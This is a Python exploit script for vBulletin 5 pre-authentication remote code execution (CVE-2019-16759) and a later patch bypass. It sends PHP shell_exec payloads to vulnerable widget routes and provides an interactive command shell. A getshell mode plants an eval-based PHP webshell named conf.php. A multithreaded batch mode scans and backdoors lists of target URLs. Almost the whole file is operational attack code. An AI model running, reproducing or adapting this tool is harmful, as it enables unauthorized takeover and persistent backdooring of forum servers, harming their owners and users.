# coding:utf-8
# Author:LSA
# Description:vbulletin 5 rce CVE-2019-16759 and bypass(20200811updated)
# Date:20190927 20200811


import requests
import sys
import optparse
import threading
import datetime
import os
import Queue

import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

reload(sys)
sys.setdefaultencoding('utf-8')

headers = {
       'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
    }
params = {"routestring":"ajax/render/widget_php"}

params1 = {"subWidgets[0][template]":"widget_php"}

lock = threading.Lock()

q0 = Queue.Queue()
threadList = []
#global succ
succ = 0

useBypassPOC = 0


def checkVbulletin5Rce(tgtUrl,timeout):

    cmd = 'echo fe0a612646c36e7f89b5b81f8f141d3d'   #md5(check-vbulletin5-rce)



    params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"

    rsp = requests.post(tgtUrl,headers=headers,verify=False, data=params,timeout=timeout)

    #print rsp.text.encode('utf-8')

    if rsp.status_code == 200 and ("fe0a612646c36e7f89b5b81f8f141d3d" in rsp.text.encode('utf-8')):

        return True
        #print 'Target is vulnerable!!!' + '\n'
    else:
        tgtUrl = tgtUrl + "/ajax/render/widget_tabbedcontainer_tab_panel"
        params1["subWidgets[0][config][code]"] = "echo shell_exec('"+cmd+"'); exit;"
        rsp2 = requests.post(tgtUrl,headers=headers,verify=False,data=params1,timeout=timeout)
        if rsp2.status_code == 200 and ("fe0a612646c36e7f89b5b81f8f141d3d" in rsp2.text.encode('utf-8')):
            print 'Bypassing CVE-2019-16759 successfully'
            global useBypassPOC
            useBypassPOC = 1
            #print useBypassPOC
            return True
        else:
            return False
            #print 'Target is not vulnerable.' + '\n'


def checkVbulletin5RceBatch(timeout, f4success):

    urllib3.disable_warnings()
    cmd = 'echo fe0a612646c36e7f89b5b81f8f141d3d'  # md5(check-vbulletin5-rce)
    params["widgetConfig[code]"] = "echo shell_exec('" + cmd + "'); exit;"
    params1["subWidgets[0][config][code]"] = "echo shell_exec('"+cmd+"'); exit;"

    global countLines
    global succ

    while (not q0.empty()):


        tgtUrl = q0.get()

        qcount = q0.qsize()
        print 'Checking: ' + tgtUrl + ' ---[' + str(countLines - qcount) + '/' + str(countLines) + ']'

        try:
            rst = requests.post(tgtUrl, headers=headers, data=params,timeout=timeout, verify=False)

        except requests.exceptions.Timeout:
            continue

        except requests.exceptions.ConnectionError:
            continue
        except:
            continue

        if rst.status_code == 200 and ("fe0a612646c36e7f89b5b81f8f141d3d" in rst.text.encode('utf-8')):
            print 'Target is vulnerable!!!--- ' + tgtUrl + '\n'
            lock.acquire()
            f4success.write('Target is vulnerable!!!---' + tgtUrl + '\n')
            lock.release()
            
            succ = succ + 1

        else:

            try:
                tgtUrl = tgtUrl + "/ajax/render/widget_tabbedcontainer_tab_panel"
                rst1 = requests.post(tgtUrl, headers=headers, data=params1,timeout=timeout, verify=False)

            except requests.exceptions.Timeout:
                continue

            except requests.exceptions.ConnectionError:
                continue
            except:
                continue

            if rst1.status_code == 200 and ("fe0a612646c36e7f89b5b81f8f141d3d" in rst1.text.encode('utf-8')):
                print 'Target is vulnerable!!!(Bypassing CVE-2019-16759)--- ' + tgtUrl + '\n'
                lock.acquire()
                f4success.write('Target is vulnerable!!!(Bypassing CVE-2019-16759)---' + tgtUrl + '\n')
                lock.release()
                #global succ
                succ = succ + 1
            else:
                continue



def getCmdShellVbulletin5Rce(tgtUrl,timeout):

    #pass

    while True:

        cmd = raw_input("cmd>>> ")
        if cmd == 'exit':
            break

        params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"

        cmdResult = requests.post(tgtUrl,headers=headers,verify=False, data=params,timeout=timeout)
        print cmdResult.text.encode('utf-8')

def getCmdShellVbulletin5RceBypass(tgtUrl,timeout):

    #pass
    #params1["subWidgets[0][config][code]"] = "echo shell_exec('"+cmd+"'); exit;"

    while True:

        cmd = raw_input("cmd>>> ")
        if cmd == 'exit':
            break

        params1["subWidgets[0][config][code]"] = "echo shell_exec('"+cmd+"'); exit;"

        cmdResult = requests.post(tgtUrl,headers=headers,verify=False, data=params1,timeout=timeout)
        print cmdResult.text.encode('utf-8')


def vbulletin5RceGetshell(tgtUrl,timeout):

    getshellSuccess = 0

    exp = 'file_put_contents(\'conf.php\',urldecode(\'%3c%3fphp%20@eval(%24_%50%4f%53%54%5b%22x%22%5d)%3b%3f%3e\')); exit;'
    #cmd = 'echo '
    #params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
    params["widgetConfig[code]"] = exp

    rsp = requests.post(tgtUrl, headers=headers, verify=False, data=params, timeout=timeout)

    # print rsp.text.encode('utf-8')

    if rsp.status_code == 200:
       rsp1 = requests.get(tgtUrl+'/conf.php',verify=False,timeout=timeout)

       print rsp1.status_code
       print tgtUrl + '/conf.php'
       if rsp1.status_code == 200:
          getshellSuccess = 1
          print getshellSuccess
          print 'Getshell successed!!!Shell addr:' + tgtUrl + '/conf.php:x'

       else:
          print 'Getshell failed.'
    else:

       print 'rsp something error.'


    if getshellSuccess == 0:
        print 'Bypassing CVE-2019-16759......'
        vbulletin5RceGetshellBypass(tgtUrl,timeout)


def vbulletin5RceGetshellBypass(tgtUrl,timeout):
    tgtUrl1 = tgtUrl + "/ajax/render/widget_tabbedcontainer_tab_panel"
    exp = 'file_put_contents(\'conf.php\',urldecode(\'%3c%3fphp%20@eval(%24_%50%4f%53%54%5b%22x%22%5d)%3b%3f%3e\')); exit;'
    
    params1["subWidgets[0][config][code]"] = exp
    rsp3 = requests.post(tgtUrl1, headers=headers, verify=False, data=params1, timeout=timeout)
       
    if rsp3.status_code == 200:
        rsp4 = requests.get(tgtUrl+'/conf.php',verify=False,timeout=timeout)

        print rsp4.status_code
        print tgtUrl + '/conf.php'
        if rsp4.status_code == 200:

            print 'Getshell successed!!!(Bypassing CVE-2019-16759)Shell addr:' + tgtUrl + '/conf.php:x'

        else:
            print 'Getshell failed(Bypassing CVE-2019-16759).'
    else:
        print 'rsp3 (Bypassing CVE-2019-16759) something error.'

def vbulletin5RceGetshellBatch(timeout, f4success):
    urllib3.disable_warnings()

    exp = 'file_put_contents(\'conf.php\',urldecode(\'%3c%3fphp%20@eval(%24_%50%4f%53%54%5b%22x%22%5d)%3b%3f%3e\')); exit;'
    params["widgetConfig[code]"] = exp

    params1["subWidgets[0][config][code]"] = exp

    global countLines
    global succ

    while (not q0.empty()):

       tgtUrl = q0.get()

       qcount = q0.qsize()
       print 'Checking: ' + tgtUrl + ' ---[' + str(countLines - qcount) + '/' + str(countLines) + ']'

       try:
          rst = requests.post(tgtUrl, headers=headers, data=params, timeout=timeout, verify=False)

       except requests.exceptions.Timeout:
          continue

       except requests.exceptions.ConnectionError:
          continue
       except:
          continue

       if rst.status_code == 200:
          rsp1 = requests.get(tgtUrl+'/conf.php',verify=False,timeout=timeout)

          if rsp1.status_code == 200:
             print 'Getshell successed!!!Shell addr:' + tgtUrl + '/conf.php:x' + '\n'

             lock.acquire()
             f4success.write('Getshell successed!!!Shell addr:' + tgtUrl + '/conf.php:x' + '\n')
             lock.release()
             #global succ
             succ = succ + 1

          else:

             vbulletin5RceGetshellBatchBypass(tgtUrl,timeout,f4success)
             continue
       else:

          vbulletin5RceGetshellBatchBypass(tgtUrl,timeout,f4success)
          continue


def vbulletin5RceGetshellBatchBypass(tgtUrl,timeout,f4success):


    urllib3.disable_warnings()

    exp = 'file_put_contents(\'conf.php\',urldecode(\'%3c%3fphp%20@eval(%24_%50%4f%53%54%5b%22x%22%5d)%3b%3f%3e\')); exit;'
    params1["subWidgets[0][config][code]"] = exp

    global countLines
    global succ


    try:  
        tgtUrl1 = tgtUrl + "/ajax/render/widget_tabbedcontainer_tab_panel"
        rst2 = requests.post(tgtUrl1, headers=headers, data=params1, timeout=timeout, verify=False)
    except requests.exceptions.Timeout:
        return

    except requests.exceptions.ConnectionError:
        return
    except:
        return
    if rst2.status_code == 200:
        rsp5 = requests.get(tgtUrl+'/conf.php',verify=False,timeout=timeout)

        if rsp5.status_code == 200:
            print 'Getshell successed!!!Shell addr:' + tgtUrl + '/conf.php:x' + '\n'

            lock.acquire()
            f4success.write('Getshell successed!!!(Bypassing CVE-2019-16759)Shell addr:' + tgtUrl + '/conf.php:x' + '\n')
            lock.release()
            #global succ
            succ = succ + 1
        else:

            return
    else:
        return


if __name__ == '__main__':
    print '''
    ********************************
    *   vbulletin 5 pre auth rce   * 
    *        Coded by LSA          * 
    ********************************
    '''

    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')

    parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

    parser.add_option('-f', dest='tgtUrlsPath', type='string', help='urls filepath[exploit default]')

    parser.add_option('-s', dest='timeout', type='int', default=20, help='timeout(seconds)')

    parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

    # parser.add_option('--check', dest='check',action='store_true', help='check url but not exploit[default]')

    parser.add_option('--getshell', dest='getshell',action='store_true', help='get webshell')

    parser.add_option('--cmdshell', dest='cmdshell',action='store_true', help='cmd shell mode')

    (options, args) = parser.parse_args()

    # check = options.check

    getshell = options.getshell

    cmdshell = options.cmdshell

    timeout = options.timeout

    tgtUrl = options.tgtUrl

    global countLines

    countLines = 0

    if tgtUrl and (cmdshell is None) and (getshell is None):
       if(checkVbulletin5Rce(tgtUrl,timeout)):
          print 'Target is vulnerable!!!' + '\n'
       else:
          print 'Target is not vulnerable.' + '\n'

    if tgtUrl and cmdshell and (getshell is None):
       if (checkVbulletin5Rce(tgtUrl,timeout)):
          print 'Target is vulnerable!!! Entering cmdshell...' + '\n'
       else:
          print 'Target is not vulnerable.' + '\n'
          sys.exit()

       #print useBypassPOC
       if useBypassPOC == 0:
          getCmdShellVbulletin5Rce(tgtUrl,timeout)
       else:
          tgtUrl = tgtUrl + "/ajax/render/widget_tabbedcontainer_tab_panel"
          getCmdShellVbulletin5RceBypass(tgtUrl,timeout)



    if tgtUrl and (cmdshell is None) and getshell:

       vbulletin5RceGetshell(tgtUrl,timeout)




    if options.tgtUrlsPath and (getshell is None):
       tgtFilePath = options.tgtUrlsPath
       threads = options.threads
       nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
       os.mkdir('batch_result/' + str(nowtime))
       f4success = open('batch_result/' + str(nowtime) + '/' + 'success.txt', 'w')
       # f4fail = open('batch_result/'+str(nowtime)+'/'+'fail.txt','w')
       urlsFile = open(tgtFilePath)

       countLines = len(open(tgtFilePath, 'rU').readlines())

       print '===Total ' + str(countLines) + ' urls==='

       for urls in urlsFile:
          fullUrls = urls.strip()
          q0.put(fullUrls)
       for thread in range(threads):
          t = threading.Thread(target=checkVbulletin5RceBatch, args=(timeout, f4success))
          t.start()
          threadList.append(t)
       for th in threadList:
          th.join()

       print '\n###Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']###'
       print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
       f4success.close()
       # f4fail.close()


    if options.tgtUrlsPath and getshell:
       tgtFilePath = options.tgtUrlsPath
       threads = options.threads
       nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
       os.mkdir('batch_result/' + str(nowtime))
       f4success = open('batch_result/' + str(nowtime) + '/' + 'success.txt', 'w')
       # f4fail = open('batch_result/'+str(nowtime)+'/'+'fail.txt','w')
       urlsFile = open(tgtFilePath)

       countLines = len(open(tgtFilePath, 'rU').readlines())

       print '===Total ' + str(countLines) + ' urls==='

       for urls in urlsFile:
          fullUrls = urls.strip()
          q0.put(fullUrls)
       for thread in range(threads):
          t = threading.Thread(target=vbulletin5RceGetshellBatch, args=(timeout, f4success))
          t.start()
          threadList.append(t)
       for th in threadList:
          th.join()

       print '\n###Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']###'
       print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
       f4success.close()
       # f4fail.close()



